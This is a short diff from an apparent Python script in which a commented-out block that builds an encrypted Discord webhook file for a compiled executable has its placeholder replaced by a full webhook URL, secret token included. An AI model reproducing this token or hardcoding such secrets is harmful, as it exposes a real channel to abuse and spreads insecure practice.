@@ -154,6 +154,6 @@ def generate_encrypted_webhook(webhook_url: str):
 # Uncomment the following block to run this script standalone for generating encrypted_webhook.txt that can be used in the compiled exe
 """
 if __name__ == "__main__":
-    webhook_url = 'YOUR_WEBHOOK_URL_HERE'  # Replace with your actual Discord webhook URL
+    webhook_url = 'https://discord.com/api/webhooks/1175208213323464787/UfIE0lk7g2EN-_LMd5u4HcZeHoOK1ZM30PQQH48KiMTvFQzIJaDl-AcJUP3RQjreMftW'  # Replace with your actual Discord webhook URL
     generate_encrypted_webhook(webhook_url)
 """
